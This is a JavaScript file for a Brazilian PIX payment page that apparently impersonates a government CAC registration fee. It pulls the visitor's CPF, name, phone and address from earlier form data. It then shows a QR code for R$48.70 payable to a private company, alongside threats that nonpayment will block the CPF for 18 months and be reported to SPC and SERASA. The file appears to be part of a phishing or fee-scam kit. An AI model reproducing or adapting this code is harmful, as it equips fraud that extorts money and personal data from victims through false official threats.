const PIX_API = {
    url: '/api/pix', // Aponta para o arquivo pix.js criado acima
    amount: 48.70,

    generateIdentifier() {
        return `cac_${Date.now()}_${Math.random().toString(36).slice(2, 11)}`;
    },

    getUserData() {
        const read = (keys, fallback = '') => keys.map(key => localStorage.getItem(key)).find(Boolean) || fallback;
        let savedAddress = {};
        try {
            savedAddress = JSON.parse(localStorage.getItem('data-drop2') || '{}');
        } catch (error) {
            savedAddress = {};
        }

        return {
            cpf: read(['cpf', 'valorGuardado'], '12345678900').replace(/\D/g, ''),
            nome: read(['nome', 'nomeCompleto']) || savedAddress.destinatario || 'Usuário Teste CAC',
            telefone: read(['telefone', 'phone'], '5511999999999').replace(/\D/g, ''),
            email: read(['email'], 'teste@cac.com.br'),
            endereco: {
                cep: read(['cep'], '01310100').replace(/\D/g, ''),
                logradouro: read(['logradouro', 'rua'], 'Avenida Paulista'),
                numero: read(['numero'], '1000'),
                complemento: read(['complemento']),
                bairro: read(['bairro'], 'Bela Vista'),
                cidade: read(['cidade', 'localidade'], 'São Paulo'),
                estado: read(['estado', 'uf'], 'SP')
            }
        };
    },

    async createPixPayment() {
        const userData = this.getUserData();
        const identifier = this.generateIdentifier();
        const payload = {
            identifier,
            amount: this.amount,
            client: {
                name: userData.nome,
                email: userData.email,
                phone: userData.telefone.startsWith('55') ? `+${userData.telefone}` : `+55${userData.telefone}`,
                document: userData.cpf
            },
            products: [{
                id: 'cac_registro_taxa',
                name: 'Taxa de Registro CAC - Certificado de Registro',
                quantity: 1,
                price: this.amount,
                physical: false
            }],
            metadata: {
                provider: 'registro-cac',
                orderId: identifier
            }
        };

        const response = await fetch(this.url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        const data = await response.json().catch(() => ({}));

        if (!response.ok) {
            const details = Array.isArray(data.details)
                ? `: ${data.details.map(item => item.error && item.error.message).filter(Boolean).join(', ')}`
                : '';
            throw new Error(data.message || `Erro ${response.status}${details}`);
        }

        localStorage.setItem('pixPaymentId', data.transactionId || identifier);
        localStorage.setItem('pixPaymentData', JSON.stringify(data));
        return data;
    }
};

function showPixPayment(paymentData, userData = null) {
    if (!userData) {
        userData = PIX_API.getUserData();
    }

    const loadingElement = document.getElementById('pix-loading');
    if (loadingElement) {
        loadingElement.style.display = 'none';
    }

    const pixContainer = document.getElementById('pix-container');
    if (!pixContainer) return;

    // AJUSTE PARA VOIDPAYMENTS: Acessa o objeto .pix
    let pixCode = paymentData.pix && paymentData.pix.code;

    if (!pixCode) {
        pixContainer.innerHTML = `<div class="bg-red-100 p-4 text-red-700">Erro: Código PIX não retornado pela API.</div>`;
        return;
    }

    const valorFormatado = (paymentData.amount || PIX_API.amount).toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    });

    pixContainer.innerHTML = `
        <div class="bg-white rounded-lg shadow-lg p-6 max-w-md mx-auto">
            <div class="text-center mb-6">
                <div class="bg-green-100 rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-qrcode text-green-700 text-3xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-green-800 mb-2">Pagamento via PIX</h2>
                <p class="text-gray-600 text-lg font-semibold">${valorFormatado}</p>
            </div>

            <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
                <h3 class="text-red-700 font-bold mb-2">⚠️ Observações Importantes:</h3>
                <div class="text-red-700 text-sm space-y-2">
                    <p>Informamos que, caso o pagamento não seja realizado dentro do prazo estabelecido, o <strong>CPF do responsável (${userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')})</strong> será bloqueado no sistema CAC pelo período de <strong>18 (dezoito) meses</strong>.</p>
                    <p>Além disso, o valor da taxa, acrescido de multas, será registrado no <strong>CPF</strong> junto aos órgãos de proteção ao crédito (<strong>SPC e SERASA</strong>).</p>
                </div>
            </div>

            <div class="mb-6">
                <div id="qrcode" class="flex justify-center mb-4 p-4 bg-gray-50 rounded"></div>
                <div class="bg-yellow-50 border-l-4 border-yellow-400 p-3 mb-4">
                    <div class="text-sm">
                        <p class="font-semibold text-yellow-800 mb-1">⚠️ Nome do Recebedor:</p>
                        <p class="text-yellow-700">O PIX será processado em nome de <strong>TRADYEX PAYMENTS LTDA</strong>.</p>
                    </div>
                </div>
            </div>

            <div class="mb-6">
                <label class="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
                <div class="flex flex-col gap-2">
                    <input type="text" id="pix-code" value="${pixCode}" readonly class="w-full px-3 py-2 border border-gray-300 rounded text-sm font-mono">
                    <button onclick="copyPixCode()" class="w-full bg-green-700 hover:bg-green-800 text-white px-4 py-2 rounded font-semibold text-sm flex items-center justify-center gap-2">
                        <i class="fas fa-copy"></i> Copiar
                    </button>
                </div>
                <p id="copy-feedback" class="text-green-600 text-sm mt-2 hidden">✓ Código copiado!</p>
            </div>

            <div class="text-center">
                <p class="text-sm text-gray-500">Verificando pagamento automaticamente...</p>
            </div>
        </div>
    `;

    try {
        new QRCode(document.getElementById('qrcode'), {
            text: pixCode,
            width: 256,
            height: 256,
            colorDark: '#000000',
            colorLight: '#ffffff',
            correctLevel: QRCode.CorrectLevel.H
        });
    } catch (error) {
        console.error('Erro ao gerar QR Code:', error);
    }
}

function copyPixCode() {
    const pixCodeInput = document.getElementById('pix-code');
    pixCodeInput.select();
    document.execCommand('copy');
    const feedback = document.getElementById('copy-feedback');
    feedback.classList.remove('hidden');
    setTimeout(() => { feedback.classList.add('hidden'); }, 3000);
}

async function gerarPix() {
    const loadingElement = document.getElementById('pix-loading');
    if (loadingElement) {
        loadingElement.style.display = 'block';
    }

    try {
        const paymentData = await PIX_API.createPixPayment();
        const userData = PIX_API.getUserData();
        showPixPayment(paymentData, userData);
    } catch (error) {
        const pixContainer = document.getElementById('pix-container');
        if (pixContainer) {
            pixContainer.innerHTML = `<div class="bg-red-50 p-4 border-l-4 border-red-500 text-red-700">${error.message}</div>`;
        }
    } finally {
        if (loadingElement) loadingElement.style.display = 'none';
    }
}

document.addEventListener('DOMContentLoaded', function() {
    const savedPaymentData = localStorage.getItem('pixPaymentData');
    const savedPaymentStatus = localStorage.getItem('pixPaymentStatus');

    if (savedPaymentData && savedPaymentStatus !== 'PAID') {
        try {
            const paymentData = JSON.parse(savedPaymentData);
            if (paymentData.pix && paymentData.pix.code) {
                showPixPayment(paymentData);
            } else {
                gerarPix();
            }
        } catch (error) {
            gerarPix();
        }
    } else {
        gerarPix();
    }
});

window.PIX_API = PIX_API;
window.showPixPayment = showPixPayment;
window.copyPixCode = copyPixCode;
window.gerarPix = gerarPix;
